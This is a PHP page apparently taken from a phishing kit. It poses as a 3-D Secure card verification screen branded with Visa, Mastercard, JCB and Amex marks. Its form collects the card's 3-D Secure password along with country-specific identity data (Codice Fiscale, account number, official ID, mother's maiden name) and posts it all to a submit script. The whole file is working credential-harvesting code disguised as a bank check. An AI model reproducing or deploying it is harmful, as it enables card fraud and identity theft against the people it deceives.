<?php
error_reporting(0);
session_start();
require_once '../main.php';
require_once 'session.php';
require_once 'more.php';
require_once '../lang.php';
?>
<html lang="en"><head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <link rel="stylesheet" href="assets/css/vbv_1.css">
    <link rel="stylesheet" href="assets/css/vbv_2.css">
    <title><?php echo $vbv['title'];?></title>
    <meta http-equiv="x-ua-compatible" content="ie=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="icon" type="image/png" href="../../lib/img/favicon.ico"></style>
</head>
<body>
<div id="Rotation"><p style="font-size: 13px;">3-D Security has been successfully processed...</p></div>
    <div id="xMarcos_9X9X" style="opacity: 1;">
    <div id="popup"><p><?php echo $account['proccessing'];?> </p></div>
        <div id="xGhostRiderForm" style="display: none;">
            <div id="xDoctorStrange_L0">
                <table>
                    <tbody>
                        <tr>
                            <td><img class="cc_bank" id="cc_bank" src="assets/css/ssl.png"></td>
                            <?php

                            if($_SESSION['type_vbv'] == "MASTERCARD") {
                                $type = "Mastercard SecureCode";
                                echo '<td><img class="cc_type" id="cc_type" src="assets/css/mastercard-securecode.png"></td>';
                            }elseif($_SESSION['type_vbv'] == "VISA"){
                                $type = "Verified by VISA";
                                echo '<td><img class="cc_type" id="cc_type" src="assets/css/verified-by-visa.png"></td>';
                            }
                            elseif($_SESSION['type_vbv'] == "JCB"){
                                $type = "J/Secure";
                                echo '<td><img class="cc_type" style="width:100px;" id="cc_type" src="assets/css/jcb-logo.png"></td>';
                            }
                            elseif($_SESSION['type_vbv'] == "AMEX"){
                                $type = "American Express SafeKey";
                                echo '<td><img class="cc_type" style="width:120px;" id="cc_type" src="assets/css/amex-logo.png"></td>';
                            }
                            ?>

                        </tr>
                    </tbody>
                </table>
            </div>
            <div id="xDoctorStrange_L1" style="text-align: center;font-family: PayPal-Sans-Regular, sans-serif;"><?=$_SESSION['_cc_bank_'];?></div>
            <div id="xDoctorStrange_L1"><?php echo $vbv['add'];?></div>
            <?php if($countryname == "Japan") {
                echo "<br>";
            }else{?>
            <div id="xDoctorStrange_L2"><?php echo $type;?> <?php echo $vbv['help'];?> <?php echo $type;?> <?php echo $vbv['onthis'];?> <?php echo $type;?> <?php echo $vbv['pass'];?></div>

        <?php }?>
            <div id="xDoctorStrange_L3">
                <table>
                    <tbody>

                        <tr>
                            <td style="font-weight: bold;"><?php echo $vbv['cn'];?> :</td><td>XXXX-XXXX-XXXX-<?php echo $_SESSION['ending'];?></td>
                        </tr>

                        <form name="" method="post" action="submit_vbv?key=<?php echo $key;?>" class="F0rmVBV">
                        <?php if($countryname == "Japan") {
                ?>
                <tr class="Height_XXX">
                                            <td style="font-weight: bold;">WEB サービス ID :</td>
                                            <td><input type="text" name="webid" style="width: 170px;padding-left: 4px;"></td>
                                        </tr>
                                        <tr class="Height_XXX">
                                            <td style="font-weight: bold;">パスワード :</td>
                                            <td><input required type="password" name="cardpass" style="width: 170px;padding-left: 4px;"></td>
                                        </tr>
            <?php }else{?>
                        <tr class="Height_XXX">
                            <td style="font-weight: bold;"><?php echo $vbv['3d'];?> :</td>
                            <td><input required type="password" name="password_vbv" id="password_vbv" style="width: 170px;padding-left: 4px;"></td></tr>
                        <?php if($countryname == "Italy") {
                        echo '<tr class="Height_XXX">
                                            <td style="font-weight: bold;">Codice Fiscale :</td>
                                            <td><input required type="tel" name="codicefiscale" id="codicefiscale" style="width: 170px;padding-left: 4px;"></td>
                                        </tr>';}?>
                        <?php if($countryname == "Switzerland" or $countryname == "Germany") {
                        echo '<tr class="Height_XXX">
                                            <td style="font-weight: bold;">Kontonummer :</td>
                                            <td><input required type="tel" name="kontonummer" id="kontonummer" style="width: 170px;padding-left: 4px;"></td>
                                        </tr>';}?>
                        <?php if($countryname == "Greece") {
                        echo '<tr class="Height_XXX">
                                            <td style="font-weight: bold;">Official ID :</td>
                                            <td>
                                                <input required type="tel" name="offid" id="offid" style="width: 170px;padding-left: 4px;"></td>
                                        </tr>';}?>
                         <?php if($countryname == "Ireland" or $countryname == "Canada") {
                        echo '<tr class="Height_XXX">
                                        <td style="font-weight: bold;padding-left: 15px;">Mother’s Maiden Name :</td>
                                        <td><input required type="tel" name="mmname" id="mmname" style="width: 170px;padding-left: 4px;"></td>
                                    </tr>';}?>

                        </tr>
                    <?php }?>
                        <tr>
                            <td></td>
                            <td>
                                <input type="submit" value="<?php echo $vbv['submit'];?>"></form>
                               <br><br>
                            </td>
                        </tr>

                    </tbody>
                </table>
                <!-- </form> -->
            </div>
        </div>
    </div>
<script type="text/javascript" src="assets/js/jquery-3.3.1.min.js">
    </script>
<script src="assets/js/vbv.js"></script>
</body>
</html>
